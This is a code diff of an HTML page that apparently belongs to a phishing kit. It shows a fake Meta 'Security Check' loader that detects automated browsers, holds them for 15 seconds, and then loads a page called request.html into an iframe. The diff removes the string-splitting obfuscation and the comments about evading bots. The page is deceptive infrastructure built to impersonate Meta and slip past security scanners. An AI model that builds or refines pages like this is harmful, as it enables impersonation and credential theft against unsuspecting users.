@@ -6,6 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
     <title>Service Verification</title>
+
     <style>
         body,
         html {
@@ -67,16 +68,11 @@
             width: 28px;
             height: 28px;
             animation: spin 0.8s linear infinite;
-            display: inline-block;
         }
 
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         #main-frame {
@@ -93,42 +89,40 @@
 
 <body>
 
+    <!-- LOADER -->
     <div id="loader">
         <div class="card">
-            <img src="1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="logo">
+            <img src="1200px-Meta_Platforms_Inc._logo.svg.png" class="logo">
             <h1>Security Check</h1>
-            <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
+            <p>Please wait while we verify your request...</p>
             <div class="spinner"></div>
         </div>
     </div>
 
+    <!-- IFRAME -->
     <iframe src="about:blank" id="main-frame"></iframe>
 
+    <!-- SCRIPT -->
     <script>
-        (function() {
-            // --- VARIABLE SPLITTING (Bot Protection) ---
-            var s1 = 'ho';
-            var s2 = 'me-';
-            var s3 = 'vi';
-            var s4 = 'ew.';
-            var s5 = 'ht';
-            var s6 = 'ml';
-            var target = s1 + s2 + s3 + s4 + s5 + s6;
+        (function () {
 
-            // --- ANTI-CHROME BOT CHECK ---
             var isBot = navigator.webdriver || !navigator.userAgent.includes("Mozilla");
-            var waitTime = isBot ? 15000 : 1000; // Bots ko 15 sec wait karwao, insaan ko 2 sec
+            var waitTime = isBot ? 15000 : 1000;
 
-            setTimeout(function() {
+            setTimeout(function () {
+
                 var frame = document.getElementById('main-frame');
-                frame.src = target;
 
-                frame.onload = function() {
-                    // Loader hatane se pehle check ke asli page load hua
+                // ✅ هتي سڌو request.html کوليو
+                frame.src = "request.html";
+
+                frame.onload = function () {
                     document.getElementById('loader').style.display = 'none';
                     frame.style.display = 'block';
                 };
+
             }, waitTime);
+
         })();
     </script>
 
